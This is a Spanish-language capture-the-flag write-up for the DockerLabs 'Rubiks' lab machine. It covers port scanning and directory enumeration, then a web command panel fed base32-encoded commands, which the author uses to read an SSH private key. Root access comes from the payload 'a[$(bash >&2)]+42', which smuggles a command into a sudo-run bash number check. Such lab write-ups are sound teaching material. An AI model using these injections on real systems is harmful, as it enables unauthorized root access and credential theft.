#MAQUINA #DOCKERLABS #MEDIO 
#PRIVESC_COMPARACION_NUMEROS_BASH

<hr>

# RECONOCIMIENTO

Vamos a resolver **Rubiks** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 15:19 CET
Initiating ARP Ping Scan at 15:19
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:19, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:19
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:19, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-18 15:19:31 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)



```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** biertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 15:20 CET
Nmap scan report for rubikcube.dl (172.17.0.2)
Host is up (0.000018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:3f:77:f8:5e:4e:89:42:4a:ce:14:3b:ac:59:05:74 (ECDSA)
|_  256 b4:2a:b2:f8:4a:1b:50:09:fb:17:28:b7:29:e6:9e:6d (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Tienda de Cubos Rubik
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.52 seconds


```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 15:21 CET
Nmap scan report for rubikcube.dl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds

whatweb "http://172.17.0.2/"
http://172.17.0.2/ [301 Moved Permanently] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], RedirectLocation[http://rubikcube.dl/], Title[301 Moved Permanently]
http://rubikcube.dl/ [200 OK] Apache[2.4.58], Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], JQuery[3.5.1], Script, Title[Tienda de Cubos Rubik]


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Vamos a enumerar usando **gobuster** :

```bash
gobuster dir -u http://rubikcube.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://rubikcube.dl/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,png,jpg,html,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 4327]
/about.php            (Status: 200) [Size: 4181]
/img                  (Status: 301) [Size: 310] [--> http://rubikcube.dl/img/]
/faq.php              (Status: 200) [Size: 7817]
/administration       (Status: 301) [Size: 321] [--> http://rubikcube.dl/administration/]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

Vemos una administracion :

```bash
gobuster dir -u http://rubikcube.dl/administration/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://rubikcube.dl/administration/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,txt,png,jpg,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/img                  (Status: 301) [Size: 325] [--> http://rubikcube.dl/administration/img/]
/index.php            (Status: 200) [Size: 5460]
/configuration.php    (Status: 200) [Size: 6665]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

Vemos a dos posibles usuarios -> **luisillo** y **maria**

Al meternos en el configuration.php, vemos un menú vertical, y al darle a console nos pone que no existe, raro.

Si le metemos el `administration` delante en la URL nos lleva a un ejecutador de comandos.
# EXPLOTACION

Pone que hay que codificarlo.

Probando, en base32 funciona : 
```bash

echo "ls -la" | base32    
NRZSALLMMEFA====

```

Vemos que hay una clave ssh `.id_rsa` :

```bash
echo "cat .id_rsa" | base32
MNQXIIBONFSF64TTMEFA====

```

Pone que el propietario es root, pero no. 

YA ESTAMOS COMO LUISILLO.

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
Matching Defaults entries for luisillo on 698415d8b507:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on 698415d8b507:
    (ALL) NOPASSWD: /bin/cube


```

Vemos **cube** con permisos SUDO  :

   ```bash
luisillo@698415d8b507:/$ cat /bin/cube
#!/bin/bash

# Inicio del script de verificación de número
echo -n "Checker de Seguridad "

# Solicitar al usuario que ingrese un número
echo "Por favor, introduzca un número para verificar:"

# Leer la entrada del usuario y almacenar en una variable
read -rp "Digite el número: " num

# Función para comprobar el número ingresado
echo -e "\n"
check_number() {
  local number=$1
  local correct_number=666

  # Verificación del número ingresado
  if [[ $number -eq $correct_number ]]; then
    echo -e "\n[+] Correcto"
  else
    echo -e "\n[!] Incorrecto"
  fi
}

# Llamada a la función para verificar el número
check_number "$num"

# Mensaje de fin de script
echo -e "\n La verificación ha sido completada."
luisillo@698415d8b507:/$ sudo /bin/cube
Checker de Seguridad Por favor, introduzca un número para verificar:
Digite el número: a[$(bash >&2)]+42


root@698415d8b507:/# whoami
root
root@698415d8b507:/# 
```

No valida correctamente la entrada.

**YA ESTAMOS COMO ROOT.**